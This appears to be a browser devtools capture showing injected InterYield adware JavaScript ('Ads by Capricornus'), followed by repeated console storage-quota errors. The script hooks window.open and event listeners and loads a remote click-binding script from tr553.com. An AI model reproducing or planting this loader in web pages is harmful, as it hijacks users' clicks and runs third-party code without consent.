-Sources:
-https://www.tr553.com/InterYield/bindevent.do?e=click&affiliate=Bitshakers2&subid=clkmidex_ID&ecpm=0&debug=false&snoozeMinutes=2&adCountIntervalHours=24&maxAdCountsPerInterval=6&attributionLogo=http%3A%2F%2Fdbo1rpcxmp3fw.cloudfront.net%2Fimg%2Flogo_vb_small.png&attributionTitle=Ads%20by%20Capricornus&attributionLink=http%3A%2F%2Fcanopus.orgfree.com%2Funinstall.html&endpoint=https%3A%2F%2Fwww.tr553.com:
-Evaluate in console:
try {
 InterYieldNativeAddEventListener = window.addEventListener;
 InterYieldNativeWindowOpen = window.open;
} catch (e) { }
FZyiyYfOvAeJBUz = function() {
try {
 InterYieldOptions= [{
   "e": "click",
   "debug": "false",
   "affiliate": "Bitshakers2",
   "subid": "clkmidex_ID",
   "ecpm": "0",
   "snoozeMinutes": "2",
   "maxAdCountsPerInterval": "6",
   "adCountIntervalHours": "24",
   "attributionLogo": "http://dbo1rpcxmp3fw.cloudfront.net/img/logo_vb_small.png",
   "attributionTitle": "Ads by Capricornus",
   "attributionLink": "http://canopus.orgfree.com/uninstall.html",
   "EndPoint": "https://www.tr553.com",
   "id": "uizVL",
   "id2": "qTMGr",
   "id3": "69a1982d3319924e24399565366ebbe6",
   "id4": "YxDZu"
}] ;
 InterYieldScript = document.createElement("script");
 InterYieldScript.type = "text/javascript";
 InterYieldScript.src = "https://www.tr553.com/InterYield/clickbinder.do?ver=1.0-SNAPSHOT.70%2C977&a=null";
 document.getElementsByTagName("head")[0].appendChild(InterYieldScript);
 delete InterYieldScript;
} catch (e) { }
};
if (typeof InterYieldOptions == "undefined" || InterYieldOptions == null ) {
    FZyiyYfOvAeJBUz();
}

Error saving setting with name: consoleHistory, value length: 5482725. Error: Failed to set the 'consoleHistory' property on 'Storage': Setting the value of 'consoleHistory' exceeded the quota.
Ten largest settings: 
Setting: 'consoleHistory', size: 5234863
Setting: 'previouslyViewedFiles', size: 4052
Setting: 'savedURLs', size: 3514
Setting: 'breakpoints', size: 227
Setting: 'watchExpressions', size: 13
Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
Setting: 'domBreakpoints', size: 2
Setting: 'eventListenerBreakpoints', size: 2
Setting: 'experiments', size: 2
Setting: 'workspaceExcludedFolders', size: 2
undefined
Error saving setting with name: savedURLs, value length: 3760. Error: Failed to set the 'savedURLs' property on 'Storage': Setting the value of 'savedURLs' exceeded the quota.
Ten largest settings: 
Setting: 'consoleHistory', size: 5234863
Setting: 'previouslyViewedFiles', size: 4052
Setting: 'savedURLs', size: 3514
Setting: 'breakpoints', size: 227
Setting: 'watchExpressions', size: 13
Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
Setting: 'domBreakpoints', size: 2
Setting: 'eventListenerBreakpoints', size: 2
Setting: 'experiments', size: 2
Setting: 'workspaceExcludedFolders', size: 2
Error saving setting with name: savedURLs, value length: 3801. Error: Failed to set the 'savedURLs' property on 'Storage': Setting the value of 'savedURLs' exceeded the quota.
Ten largest settings: 
Setting: 'consoleHistory', size: 5234863
Setting: 'previouslyViewedFiles', size: 4052
Setting: 'savedURLs', size: 3514
Setting: 'breakpoints', size: 227
Setting: 'watchExpressions', size: 13
Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
Setting: 'domBreakpoints', size: 2
Setting: 'eventListenerBreakpoints', size: 2
Setting: 'experiments', size: 2
Setting: 'workspaceExcludedFolders', size: 2
